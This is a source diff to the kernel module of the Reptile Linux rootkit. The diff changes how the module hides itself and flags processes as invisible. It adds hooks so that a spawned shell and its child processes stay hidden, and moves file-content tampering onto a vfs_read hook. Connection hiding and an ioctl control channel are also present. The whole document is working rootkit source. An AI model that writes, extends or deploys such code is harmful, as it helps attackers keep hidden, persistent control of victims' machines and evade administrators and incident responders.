@@ -5,6 +5,7 @@
  *
  */
 
+#include <linux/binfmts.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
 #include <linux/file.h>
@@ -56,32 +57,19 @@
 #define HTUA 0xc0debabe
 #define RL_BUFSIZE 2048
 #define TOK_BUFSIZE 64
-#define TOK_DELIM                                                              \
-	({                                                                     \
-		unsigned int *p = __builtin_alloca(4);                         \
-		p[0] = 0x00000020;                                             \
-		(char *)p;                                                     \
+#define TOK_DELIM                                      \
+	({                                             \
+		unsigned int *p = __builtin_alloca(4); \
+		p[0] = 0x00000020;                     \
+		(char *)p;                             \
 	})
 #define ID 12345
 #define SEQ 28782
 #define WIN 8192
 #define TMPSZ 150
+#define FLAG 0x80000000
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-#define VFS_READ                                                               \
-	({                                                                     \
-		unsigned int *p = (unsigned int *)__builtin_alloca(9);         \
-		p[0] = 0x5f736676;                                             \
-		p[1] = 0x64616572;                                             \
-		p[2] = 0x00;                                                   \
-		(char *)p;                                                     \
-	})
-
-asmlinkage ssize_t (*vfs_read_addr)(struct file *file, char __user *buf,
-				    size_t count, loff_t *pos);
-#endif
-
-int hidden = 0, hide_file_content = 0, control_flag = 0;
+int hidden = 1, hide_module = 0, file_tampering = 0, control_flag = 0;
 struct workqueue_struct *work_queue;
 static struct nf_hook_ops magic_packet_hook_options;
 static struct list_head *mod_list;
@@ -147,7 +135,7 @@ unsigned long get_symbol(char *name)
 
 void hide(void)
 {
-	if (hidden)
+	if (hide_module)
 		return;
 
 	while (!mutex_trylock(&module_mutex))
@@ -157,19 +145,19 @@ void hide(void)
 	kfree(THIS_MODULE->sect_attrs);
 	THIS_MODULE->sect_attrs = NULL;
 	mutex_unlock(&module_mutex);
-	hidden = 1;
+	hide_module = 1;
 }
 
 void show(void)
 {
-	if (!hidden)
+	if (!hide_module)
 		return;
 
 	while (!mutex_trylock(&module_mutex))
 		cpu_relax();
 	list_add(&THIS_MODULE->list, mod_list);
 	mutex_unlock(&module_mutex);
-	hidden = 0;
+	hide_module = 0;
 }
 
 struct task_struct *find_task(pid_t pid)
@@ -190,6 +178,42 @@ struct task_struct *find_task(pid_t pid)
 	return ret;
 }
 
+int flag_tasks(pid_t pid, int set)
+{
+	int ret = 0;
+	struct pid *p;
+
+	rcu_read_lock();
+	p = find_get_pid(pid);
+	if (p) {
+		struct task_struct *task = get_pid_task(p, PIDTYPE_PID);
+		if (task) {
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
+			struct task_struct *t = NULL;
+
+			for_each_thread(task, t)
+			{
+				if (set)
+					t->flags |= FLAG;
+				else
+					t->flags &= ~FLAG;
+
+				ret++;
+			}
+#endif
+			if (set)
+				task->flags |= FLAG;
+			else
+				task->flags &= ~FLAG;
+
+			put_task_struct(task);
+		}
+		put_pid(p);
+	}
+	rcu_read_unlock();
+	return ret;
+}
+
 int is_invisible(pid_t pid)
 {
 	struct task_struct *task;
@@ -200,7 +224,7 @@ int is_invisible(pid_t pid)
 	task = find_task(pid);
 	if (!task)
 		return ret;
-	if (task->flags & 0x10000000)
+	if (task->flags & FLAG)
 		ret = 1;
 	put_task_struct(task);
 	return ret;
@@ -789,37 +813,20 @@ final:
 	return ret;
 }
 
-KHOOK(sys_read);
-static ssize_t khook_sys_read(unsigned int fd, char __user *buf, size_t count)
+KHOOK_EXT(ssize_t, vfs_read, struct file *file, char __user *buf, size_t count, loff_t *pos);
+static ssize_t khook_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
 {
-	struct file *f;
-	int fput_needed;
 	ssize_t ret;
 
-	KHOOK_GET(sys_read);
+	KHOOK_GET(vfs_read);
+	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);
 
-	if (hide_file_content) {
-		ret = -EBADF;
-
-		f = e_fget_light(fd, &fput_needed);
-
-		if (f) {
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
-			ret = vfs_read(f, buf, count, &f->f_pos);
-#else
-			ret = vfs_read_addr(f, buf, count, &f->f_pos);
-#endif
-			if (f_check(buf, ret) == 1)
-				ret = hide_content(buf, ret);
-
-			fput_light(f, fput_needed);
-		}
-	} else {
-		ret = KHOOK_ORIGIN(sys_read, fd, buf, count);
+	if (file_tampering) {
+		if (f_check(buf, ret) == 1)
+			ret = hide_content(buf, ret);
 	}
 
-	KHOOK_PUT(sys_read);
-
+	KHOOK_PUT(vfs_read);
 	return ret;
 }
 
@@ -832,7 +839,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 	unsigned int pid;
 	struct control args;
 	struct sockaddr_in addr;
-	struct task_struct *task;
+	//struct task_struct *task;
 	struct hidden_conn *hc;
 
 	KHOOK_GET(inet_ioctl);
@@ -852,27 +859,30 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 
 		switch (args.cmd) {
 		case 0:
-			if (hidden)
+			if (hide_module) {
 				show();
-			else
+				hidden = 0;
+			} else {
 				hide();
+				hidden = 1;
+			}
 			break;
 		case 1:
 			if (copy_from_user(&pid, args.argv,
 					   sizeof(unsigned int)))
 				goto out;
 
-			if ((task = find_task(pid)) == NULL)
-				goto out;
+			if (is_invisible(pid))
+				flag_tasks(pid, 0);
+			else
+				flag_tasks(pid, 1);
 
-			task->flags ^= 0x10000000;
-			put_task_struct(task);
 			break;
 		case 2:
-			if (hide_file_content)
-				hide_file_content = 0;
+			if (file_tampering)
+				file_tampering = 0;
 			else
-				hide_file_content = 1;
+				file_tampering = 1;
 			break;
 		case 3:
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
@@ -946,15 +956,21 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 
 	KHOOK_GET(tcp4_seq_show);
 
-	seq_setwidth(seq, TMPSZ - 1);
+	//seq_setwidth(seq, TMPSZ - 1);
 	if (v == SEQ_START_TOKEN) {
 		ret = 0;
 		goto out;
 	}
 
 	inet = (struct inet_sock *)sk;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
 	dport = inet->inet_dport;
 	daddr = inet->inet_daddr;
+#else
+	dport = inet->dport;
+	daddr = inet->daddr;
+#endif
 
 	list_for_each_entry(hc, &hidden_tcp_conn, list)
 	{
@@ -971,16 +987,52 @@ out:
 	return ret;
 }
 
+KHOOK_EXT(int, load_elf_binary, struct linux_binprm *bprm);
+static int khook_load_elf_binary(struct linux_binprm *bprm)
+{
+	int ret = 0;
+
+	KHOOK_GET(load_elf_binary);
+	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
+	if (!ret && !strcmp(bprm->filename, SHELL))
+		flag_tasks(current->pid, 1);
+
+	KHOOK_PUT(load_elf_binary);
+
+	return ret;
+}
+
+KHOOK(copy_creds);
+static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
+{
+	int ret = 0;
+
+	KHOOK_GET(copy_creds);
+	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
+	if (!ret && current->flags & FLAG)
+		p->flags |= FLAG;
+
+	KHOOK_PUT(copy_creds);
+
+	return ret;
+}
+
+KHOOK(exit_creds);
+static void khook_exit_creds(struct task_struct *p)
+{
+	KHOOK_GET(exit_creds);
+	KHOOK_ORIGIN(exit_creds, p);
+	if (p->flags & FLAG)
+		p->flags &= ~FLAG;
+
+	KHOOK_PUT(exit_creds);
+}
+
 static int __init reptile_init(void)
 {
 	int ret;
 	char *argv[] = {START, NULL, NULL};
 
-	hide();
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-	vfs_read_addr = (void *)get_symbol(VFS_READ);
-#endif
 	work_queue = create_workqueue(WORKQUEUE);
 
 	magic_packet_hook_options.hook = (void *)magic_packet_hook;
@@ -995,6 +1047,7 @@ static int __init reptile_init(void)
 #endif
 	ret = khook_init();
 	exec(argv);
+	hide();
 
 	return ret;
 }
